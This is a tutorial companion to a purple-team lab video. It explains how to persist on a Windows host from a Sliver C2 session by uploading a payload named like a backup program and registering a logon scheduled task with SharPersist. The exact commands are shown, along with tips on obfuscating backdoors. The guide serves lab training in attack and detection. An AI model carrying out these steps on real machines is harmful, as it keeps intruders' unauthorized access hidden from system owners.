## **06 - How To Setup Persistence with Sliver - Purple Team Cyber Range with NHA-GOAD And Elastic Siem**

This guide is a companion to the **sixth video** in the **Purple Team Cyber Range** series. In this guide, we focus on establishing **persistence** using the **Sliver C2 framework** after gaining initial access, as demonstrated in the previous video. The lab environment, **NHA-GOAD**, is designed for both red and blue team exercises, providing a realistic Active Directory environment for attack and defense simulations.

## 📺 **Watch the Video**

**Video Title**: _06 - Persistence Setup - Purple Team Cyber Range with NHA-GOAD_  
[Watch the video on YouTube](https://youtu.be/BjOPT3t3i_c?si=Pz0Z3nU9ZbprWUMi)

## 🛠️ **Key Takeaways**

## 1. **What is Persistence?**

Persistence refers to techniques that allow an attacker to maintain long-term access to a compromised system, even after reboots or system patches. This is crucial for attackers who want to keep control of a system without needing to exploit it again after every reboot or cleanup effort.

## 2. **Where Persistence Falls in the Cyber Kill Chain**

Persistence is a critical step in the **Post-Exploitation** phase of the cyber kill chain. Once an attacker has successfully gained initial access to a target system (as demonstrated in video 5), they must establish mechanisms to maintain that access over time, even after reboots or defensive measures. Persistence techniques, such as creating scheduled tasks, services, or registry modifications, ensure that the attacker’s foothold remains intact and allows them to regain control of the compromised system without needing to exploit it again. This step is crucial for long-term operations and maintaining access through disruptions like system reboots or user logouts.

## 3. **Steps to Establish Persistence Using Sliver**

We will cover one key persistence technique:

- Creating a scheduled task that runs at system startup.

## Previous Videos:

- [Video 1: How to Deploy a Cyber Range Using Ludus: NHA-GOAD for Purple Teaming & Elastic Security SIEM](https://youtu.be/cjTzWQ_Si3U)
- [Video 2: How to Connect to Ludus GOAD with Elastic Using WireGuard](https://youtu.be/fM65Mm011bg)
- [Video 3: Testing Our Lab Against Default Sliver C2 Implants - The Lab Works!](https://youtu.be/L5DtvxOriOU)
- [Video 4: How to Install Sysmon in Active Directory Lab on Ludus](https://youtu.be/bK5Tnf92O-Y)
- [Video 5: Initial Access - Purple Team Cyber Range with NHA-GOAD](https://youtu.be/ahpytVKtwK8)

## 🚀 **Getting Started**

## 1. **Establishing Persistence Using Sliver**

Assuming you have already gained access through a Sliver session (as demonstrated in video 5), we will now set up persistence using a scheduled task that runs at system startup and executes a payload.

## A. **Create a Scheduled Task That Runs at System Startup**

In this section, we will create a scheduled task using **SharPersist** that executes `C:\Windows\Tasks\backup.exe` every time the system starts.

## Step-by-Step Instructions:

1. **Upload your payload**:  
    First, upload your malicious payload (e.g., `backup.exe`) to the target machine:
    
    `upload /path/to/your/payload.exe C:\Windows\Tasks\backup.exe`
    
2. **Create a scheduled task using SharPersist**:  
    Use Sliver’s `execute-assembly` feature to run SharPersist and create a scheduled task that runs at system startup:
    
    `execute-assembly /home/kali/payloads/SharPersist.exe -t schtask -c "C:\Windows\Tasks\backup.exe" -n "BackupTask" -m add -o logon`
    
    - `-t schtask`: Specifies that you're using the scheduled task technique.
    - `-c "C:\Windows\Tasks\backup.exe"`: Specifies the command (your payload) that will be executed.
    - `-n "BackupTask"`: The name of the scheduled task.
    - `-m add`: Adds the scheduled task.
    - `-o logon`: Ensures that the task triggers at system startup (logon).
    
3. **Verify task creation**:  
    After creating the scheduled task, verify it by listing all tasks:
    
    `execute-assembly /home/kali/payloads/SharPersist.exe -t schtask -m list`
    
4. **Manually trigger the task (optional)**:  
    If you want to test whether your payload works without waiting for a reboot, you can manually trigger the scheduled task:
    
    `execute "schtasks /run /tn BackupTask"`
    
5. **Remove the scheduled task (optional)**:  
    If you need to remove this persistence mechanism later, you can use SharPersist’s `remove` option:
    
    `execute-assembly /home/kali/payloads/SharPersist.exe -t schtask -n "BackupTask" -m remove`
    

## B. **Additional Tips for Maintaining Persistence**

- Use obfuscation techniques to hide your backdoor services or users from detection.
- Regularly monitor your persistence mechanisms to ensure they are still functioning.
- Consider using more advanced techniques like DLL hijacking or registry modifications for stealthier persistence.

## ⚠️ **Disclaimer**

This project is intended for educational purposes only. The tools and techniques demonstrated should only be used in environments where you have explicit permission to perform penetration testing or security assessments. Unauthorized use of these tools may violate laws and regulations.

## 🔧 **Tools Used**

- **Ludus Platform**: A cloud-based platform for deploying cybersecurity labs.
- **NHA-GOAD**: A pre-configured Active Directory environment designed for attack and defense simulations.
- **Sliver C2 Framework**: An open-source command-and-control framework used by attackers for post-exploitation tasks.
- **SharPersist**: A C# Windows persistence toolkit used for establishing various persistence methods.

Thank you for visiting! Be sure to subscribe to [I.T Security Labs on YouTube](https://www.youtube.com/@ITSecurityLabs) for more tutorials and updates!